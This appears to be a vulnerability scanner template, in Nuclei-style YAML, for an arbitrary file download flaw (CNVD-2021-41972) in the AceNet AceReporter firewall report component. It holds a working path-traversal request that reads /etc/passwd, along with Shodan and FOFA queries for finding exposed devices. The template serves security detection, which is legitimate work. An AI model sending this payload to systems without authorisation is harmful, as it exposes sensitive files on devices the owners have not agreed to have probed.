http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - condition: and
    part: header
    type: word
    words:
    - filename=
    - application/octet-stream
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/view/action/download_file.php?filename=../../../../../../../../../etc/passwd&savename={{filename}}.txt'
id: CNVD-2021-41972
info:
  author: DhiyaneshDk
  description: 'All firewall devices that use the AceNet AceReporter report component
    can download arbitrary files

    '
  metadata:
    fofa-query: body="Login @ Reporter"
    max-request: 1
    shodan-query: http.favicon.hash:-1595726841
    verified: true
  name: AceNet AceReporter Report - Arbitrary File Download
  reference:
  - https://www.cnvd.org.cn/flaw/show/CNVD-2021-41972
  - https://github.com/hktalent/scan4all/blob/main/lib/goby/goby_pocs/AceNet_AceReporter_Report_component_Arbitrary_file_download.txt
  severity: high
  tags: cnvd,cnvd2021,acenet,acereporter,lfi
variables:
  filename: '{{to_lower(rand_text_alpha(5))}}'
